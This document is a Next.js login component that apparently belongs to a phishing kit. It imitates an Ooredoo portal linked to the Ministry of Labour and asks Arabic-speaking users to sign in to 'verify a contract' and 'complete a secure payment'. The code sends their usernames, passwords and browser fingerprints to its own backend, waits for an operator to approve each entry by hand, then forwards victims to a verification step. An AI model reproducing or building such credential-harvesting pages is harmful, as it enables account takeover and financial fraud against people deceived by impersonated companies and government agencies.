"use client";

import { useState, useEffect, useRef, FormEvent, useCallback } from "react";
import { useRouter } from "next/navigation";
import { getFingerprint } from "@/lib/presence";
import { subscribeToEntryStatus } from "@/lib/realtime";
import styles from "./MaawenLogin.module.css";

interface LoginResponse {
  entryId?: string;
  status?: string;
  error?: string;
}

export function MaawenLoginClient({ locale = "ar" }: { locale?: string }) {
  const router = useRouter();
  const prefix = `/${locale}`;
  const [showIntro, setShowIntro] = useState(true);
  const [waiting, setWaiting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [entryId, setEntryId] = useState<string | null>(null);
  const [showPw, setShowPw] = useState(false);
  const waitingRef = useRef(false);

 // متابعة قرار المدير على طلب الدخول.
  const checkStatus = useCallback(
    async (id: string) => {
      try {
        const res = await fetch(`/api/maawen/login/status?entryId=${id}`, {
          cache: "no-store" as RequestCache,
          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
        });
        const data = await res.json();
        if (data.status === "approved") {
          router.replace(`${prefix}/maawen/verify/${id}`);
          return;
        }
        if (data.status === "rejected") {
          waitingRef.current = false;
          setWaiting(false);
          setError("تم رفض طلب تسجيل الدخول. يرجى المحاولة مرة أخرى.");
          return;
        }
      } catch {
        // تجاهل أخطاء الشبكة مؤقتاً — الـ polling يستمر
      }
    },
    [router, prefix],
  );

  useEffect(() => {
    if (!waiting || !entryId) return;
    let cancelled = false;

    const channel = subscribeToEntryStatus(
      entryId,
      () => {
        if (!cancelled) void checkStatus(entryId);
      },
      () => {
        if (!cancelled) void checkStatus(entryId);
      },
    );

    void checkStatus(entryId);

    const interval = setInterval(() => {
      if (!cancelled) void checkStatus(entryId);
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [waiting, entryId, checkStatus]);

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setError(null);

    const form = e.currentTarget;
    const credential = String(form.credential.value ?? "").trim();
    const email = credential.includes("@") ? credential.toLowerCase() : "";
    const username = credential.includes("@") ? "" : credential;
    const password = String(form.password.value ?? "");

    if (password.length < 4) {
      setError("كلمة المرور قصيرة جداً");
      return;
    }

    const fingerprint = typeof window !== "undefined" ? getFingerprint() : "ssr";

    setWaiting(true);
    waitingRef.current = true;

    try {
      const res = await fetch("/api/maawen/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": fingerprint,
        },
        body: JSON.stringify({ email, username, password }),
      });
      const data = (await res.json().catch(() => ({}))) as LoginResponse;
      if (!res.ok) {
        waitingRef.current = false;
        setWaiting(false);
        setError(data.error || "حدث خطأ في تسجيل الدخول");
        return;
      }
      if (data.entryId) {
        setEntryId(data.entryId);
      }
    } catch {
      waitingRef.current = false;
      setWaiting(false);
      setError("تعذر الاتصال بالخادم. يرجى المحاولة مرة أخرى.");
    }
  }

  const inputClass = `${styles.inputField} ${error ? styles.inputError : ""}`;

  if (waiting) {
    return (
      <div className={`${styles.page} ${styles.waitingPage}`}>
        <div className={styles.modalBrand}>
          <span className={styles.brandName}>ooredoo</span>
          <span className={styles.brandDivider} />
          <span className={styles.brandGov}>وزارة العمل</span>
        </div>
        <div className={styles.verifyBox}>
          <div className={styles.spinner} />
          <h3 className={styles.verifyTitle}>جارٍ التحقق...</h3>
          <p className={styles.verifySub}>يرجى الانتظار لحظات</p>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.page}>
      {/* النافذة المنبثقة الأولى (توثيق العقد) — تظهر لمرة واحدة فقط */}
      {showIntro && (
        <div className={styles.modalOverlay}>
          <div className={styles.modalCard}>
            <button type="button" aria-label="إغلاق" className={styles.modalClose} onClick={() => setShowIntro(false)}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M18 6 6 18" />
                <path d="m6 6 12 12" />
              </svg>
            </button>
            <div className={styles.modalBrand}>
              <span className={styles.brandName}>ooredoo</span>
              <span className={styles.brandDivider} />
              <span className={styles.brandGov}>وزارة العمل</span>
            </div>
            <div className={styles.modalBody}>
              <h2 className={styles.modalTitle}>توثيق العقد إلكترونياً</h2>
              <p className={styles.modalText}>
                يرجى تسجيل الدخول إلى حسابك لدى <span className={styles.modalAccent}>ooredoo</span> لتوثيق العقد إلكترونياً من خلال{" "}
                <span className={styles.modalStrong}>وزارة العمل</span> عبر منصة ooredoo الرقمية.
              </p>
              <button type="button" className={styles.modalBtn} onClick={() => setShowIntro(false)}>
                متابعة
              </button>
            </div>
          </div>
        </div>
      )}

      <div className={styles.mainWrapper}>
        <div className={styles.loginContainer}>
          <h1 className={styles.title}>
            تسجيل الدخول إلى<br />
            <span className={styles.brandText}>منصة ooredoo! 👋</span>
          </h1>

          <p className={styles.subtitle}>
            يرجى القيام بتسجيل الى حسابك لدى ooredoo لاصدار العقد الالكتروني واتمام عملية الدفع الامنة
          </p>

          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.formGroup}>
              <input
                type="text"
                name="credential"
                className={inputClass}
                placeholder="البريد الإلكتروني أو اسم المستخدم"
                autoComplete="username"
                required
              />
            </div>

            <div className={`${styles.formGroup} ${styles.passwordWrapper}`}>
              <input
                type={showPw ? "text" : "password"}
                name="password"
                className={inputClass}
                placeholder="كلمة المرور"
                autoComplete="current-password"
                required
              />
              <button type="button" className={styles.togglePassword} aria-label="عرض كلمة المرور" onClick={() => setShowPw((v) => !v)}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                  <line x1="1" y1="1" x2="23" y2="23" />
                </svg>
              </button>
            </div>

            <div>
              <a href="#" className={styles.forgotPassword} onClick={(e) => e.preventDefault()}>
                هل نسيت كلمة المرور؟
              </a>
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <button type="submit" className={`${styles.btn} ${styles.btnSubmit}`}>تسجيل الدخول</button>
            <button type="button" className={`${styles.btn} ${styles.btnCreate}`} onClick={() => router.push(`${prefix}/register`)}>إنشاء حساب</button>
          </form>
        </div>
      </div>

      <div className={styles.footer}>
        <span className={styles.footerBrand}>ooredoo</span>
        <span className={styles.footerGov} dir="ltr">Government Contact Center</span>
      </div>
    </div>
  );
}